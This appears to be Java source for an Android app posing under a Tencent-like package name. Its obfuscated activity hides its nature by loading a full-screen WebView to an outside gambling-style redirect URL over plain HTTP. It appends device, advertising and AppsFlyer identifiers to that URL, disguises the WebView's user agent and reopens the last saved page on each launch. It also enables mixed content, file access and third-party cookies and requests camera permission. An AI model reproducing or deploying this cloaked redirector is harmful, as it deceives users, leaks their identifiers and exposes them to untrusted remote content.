package com.tencent.igv.ageblack;

import static com.tencent.igv.ageblack.AppClassElectrum.KSDFISDIOOSDFOSDF;
import static com.tencent.igv.ageblack.MainActivity.JUSADIODSAKDSKA;
import static com.tencent.igv.ageblack.ReplElectrum.OASDIASDJKASJD;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.appsflyer.AppsFlyerLib;
import com.orhanobut.hawk.Hawk;
import com.tencent.igv.R;

import java.io.File;
import java.io.IOException;

public class RealElectrum extends AppCompatActivity {
    private ValueCallback<Uri> nzksaodoasdo;
    private Uri hsadoasodksadk = null;

    private static final String IDWQIDIQJKWDJSAJ = RealElectrum.class.getSimpleName();
    private static final int HSAJDKSDAKKDASKD = 1;


    private ValueCallback<Uri[]> tdqwhdkksakdkas;
    private String quwiqieksakdksa;
    WebView pdqwodqwdlskadkask;


    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_real);
        pdqwodqwdlskadkask = findViewById(R.id.realView);

        WebSettings webSettings = pdqwodqwdlskadkask.getSettings();

        webSettings.setJavaScriptEnabled(true);


        webSettings.setPluginState(WebSettings.PluginState.ON);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        webSettings.setAppCacheEnabled(true);


        webSettings.setUseWideViewPort(true);
        webSettings.setUserAgentString(webSettings.getUserAgentString().replace("; wv", ""));

        webSettings.setLoadWithOverviewMode(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setDomStorageEnabled(true);

        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        webSettings.setSupportMultipleWindows(false);

        webSettings.setDisplayZoomControls(false);
        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);


        webSettings.setAllowContentAccess(true);

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(pdqwodqwdlskadkask,true);


        final Activity activity = this;
        pdqwodqwdlskadkask.setWebViewClient(new WebViewClient() {

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {

                view.loadUrl(url);
                return false;
            }


            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);


                if(pdqwodqwdlskadkask.getProgress() == 100) {
                    pdqwodqwdlskadkask.setVisibility(View.VISIBLE);
                    rwqrdqwdhjasdjasjd(url);
                }
            }

            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show();
            }
        });


        pdqwodqwdlskadkask.loadUrl(twqgdjwdjkkaskdaskk());

        String osapdsdasdi = Manifest.permission.CAMERA;
        int rqwtdywqhjs = ContextCompat.checkSelfPermission(this, osapdsdasdi);
        if (rqwtdywqhjs != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = osapdsdasdi;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }

        pdqwodqwdlskadkask.setWebChromeClient(new WebChromeClient() {


            public boolean onShowFileChooser(
                    WebView webView, ValueCallback<Uri[]> filePathCallback,
                    WebChromeClient.FileChooserParams fileChooserParams) {
                if (tdqwhdkksakdkas != null) {
                    tdqwhdkksakdkas.onReceiveValue(null);
                }
                tdqwhdkksakdkas = filePathCallback;

                Intent twqdyhjdjkasdjk = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (twqdyhjdjkasdjk.resolveActivity(getPackageManager()) != null) {

                    // create the file where the photo should go
                    File kksaidjasjdasj = null;
                    try {
                        kksaidjasjdasj = msandjasdasiiasdi();
                        twqdyhjdjkasdjk.putExtra("PhotoPath", quwiqieksakdksa);
                    } catch (IOException ex) {
                        // Error occurred while creating the File
                        Log.e(IDWQIDIQJKWDJSAJ, "Unable to create Image File", ex);
                    }

                    // continue only if the file was successfully created
                    if (kksaidjasjdasj != null) {
                        quwiqieksakdksa = "file:" + kksaidjasjdasj.getAbsolutePath();
                        twqdyhjdjkasdjk.putExtra(MediaStore.EXTRA_OUTPUT,
                                Uri.fromFile(kksaidjasjdasj));
                    } else {
                        twqdyhjdjkasdjk = null;
                    }
                }

                Intent ldodpfspfdsofdo = new Intent(Intent.ACTION_GET_CONTENT);
                ldodpfspfdsofdo.addCategory(Intent.CATEGORY_OPENABLE);
                ldodpfspfdsofdo.setType("image/*");

                Intent[] sgaydasjdjasjd;
                if (twqdyhjdjkasdjk != null) {
                    sgaydasjdjasjd = new Intent[]{twqdyhjdjkasdjk};
                } else {
                    sgaydasjdjasjd = new Intent[0];
                }

                Intent podsfkfsdkkfd = new Intent(Intent.ACTION_CHOOSER);
                podsfkfsdkkfd.putExtra(Intent.EXTRA_INTENT, ldodpfspfdsofdo);
                podsfkfsdkkfd.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser));
                podsfkfsdkkfd.putExtra(Intent.EXTRA_INITIAL_INTENTS, sgaydasjdjasjd);

                startActivityForResult(podsfkfsdkkfd, HSAJDKSDAKKDASKD);

                return true;
            }

            private File msandjasdasiiasdi() throws IOException {

                File tdwqydhasjdjasj = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "DirectoryNameHere");

                if (!tdwqydhasjdjasj.exists()) {
                    tdwqydhasjdjasj.mkdirs();
                }

                // create an image file name
                tdwqydhasjdjasj = new File(tdwqydhasjdjasj + File.separator + "IMG_" + String.valueOf(System.currentTimeMillis()) + ".jpg");
                return tdwqydhasjdjasj;
            }

            public void qrwtdqjdjsajdasj(ValueCallback<Uri> uploadMsg, String acceptType) {
                nzksaodoasdo = uploadMsg;

                try {
                    File ydqwudjsajdjasjd = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "DirectoryNameHere");

                    if (!ydqwudjsajdjasjd.exists()) {
                        ydqwudjsajdjasjd.mkdirs();
                    }

                    File masdjasjdjas = new File(ydqwudjsajdjasjd + File.separator + "IMG_" + String.valueOf(System.currentTimeMillis()) + ".jpg");

                    hsadoasodksadk = Uri.fromFile(masdjasjdjas); // save to the private variable

                    final Intent rwqrdhsajdjasjdj = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                    rwqrdhsajdjasjdj.putExtra(MediaStore.EXTRA_OUTPUT, hsadoasodksadk);
                    //captureIntent.putExtra(MediaStore.EXTRA_SCREEN_ORIENTATION, ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

                    Intent bsajdkasdkasndashd = new Intent(Intent.ACTION_GET_CONTENT);
                    bsajdkasdkasndashd.addCategory(Intent.CATEGORY_OPENABLE);
                    bsajdkasdkasndashd.setType("image/*");

                    Intent chooserIntent = Intent.createChooser(bsajdkasdkasndashd, getString(R.string.image_chooser));
                    chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, new Parcelable[]{rwqrdhsajdjasjdj});

                    startActivityForResult(chooserIntent, HSAJDKSDAKKDASKD);
                } catch (Exception e) {
                    Toast.makeText(getBaseContext(), "Camera Exception:" + e, Toast.LENGTH_LONG).show();
                }

            }

        });

    }

    public void rwqrdqwdhjasdjasjd(String url) {
        SharedPreferences nsabdgashdjaskdk = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE);
        SharedPreferences.Editor editor = nsabdgashdjaskdk.edit();
        editor.putString("SAVED_URL", url);
        editor.apply();
    }

    public String twqgdjwdjkkaskdaskk(){


        String  nsadjaskdklasdk, odqoppdsoadoaso, gqwdghjsajdjasd, basdajksdkaskdks;

        String tywdqjdkaskdkaskd, ahsajdsksadkaksd, mdwqkdoosadoasodas, tqwdhwjdjksakdask, bsahdjasdkaskdk, sladoasdasjdjasj;

        SharedPreferences uwqudjqwj = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE);


        nsadjaskdklasdk = Hawk.get(OASDIASDJKASJD);
        gqwdghjsajdjasd = Hawk.get(JUSADIODSAKDSKA);
        odqoppdsoadoaso = Hawk.get(KSDFISDIOOSDFOSDF);
        basdajksdkaskdks = "com.tencent.igv";
        String afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        AppsFlyerLib.getInstance().setCollectAndroidID(true);
        String androidVersion = Build.VERSION.RELEASE;


        tywdqjdkaskdkaskd = "sub_id_1=";
        ahsajdsksadkaksd = "deviceID=";
        mdwqkdoosadoasodas = "ad_id=";
        tqwdhwjdjksakdask = "sub_id_4=";
        bsahdjasdkaskdk = "sub_id_5=";
        sladoasdasjdjasj = "sub_id_6=";


        String ydqwhwjdsjadj = "http://";
        String nsadjasjkdkas = "ageofelectrum.xyz/go.php?to=2&";
        String fsafdtasydyas = ydqwhwjdsjadj + nsadjasjkdkas;

        String fff;

        if (!nsadjaskdklasdk.equals("null")){
            fff = fsafdtasydyas+tywdqjdkaskdkaskd+nsadjaskdklasdk+"&"+ahsajdsksadkaksd+afId+"&"+mdwqkdoosadoasodas+odqoppdsoadoaso+"&"+tqwdhwjdjksakdask+basdajksdkaskdks+"&"+bsahdjasdkaskdk+androidVersion+"&"+sladoasdasjdjasj+"naming";
        }

        else{
            fff = fsafdtasydyas+tywdqjdkaskdkaskd+gqwdghjsajdjasd+"&"+ahsajdsksadkaksd+afId+"&"+mdwqkdoosadoasodas+odqoppdsoadoaso+"&"+tqwdhwjdjksakdask+basdajksdkaskdks+"&"+bsahdjasdkaskdk+androidVersion+"&"+sladoasdasjdjasj+"deeporg";
        }


        Log.d("TESTAG", "Test Result " + fff);


        return uwqudjqwj.getString("SAVED_URL", fff);
    }



    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {



        if (requestCode != HSAJDKSDAKKDASKD || tdqwhdkksakdkas == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }

        Uri[] bsadasjkdkaskd = null;

        if (resultCode == Activity.RESULT_OK) {
            if (data == null || data.getData() == null) {
                if (quwiqieksakdksa != null) {
                    bsadasjkdkaskd = new Uri[]{Uri.parse(quwiqieksakdksa)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    bsadasjkdkaskd = new Uri[]{Uri.parse(dataString)};
                }
            }
        }

        tdqwhdkksakdkas.onReceiveValue(bsadasjkdkaskd);
        tdqwhdkksakdkas = null;

    }

    @Override
    public void onBackPressed() {
        if (pdqwodqwdlskadkask.canGoBack()) {
            pdqwodqwdlskadkask.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
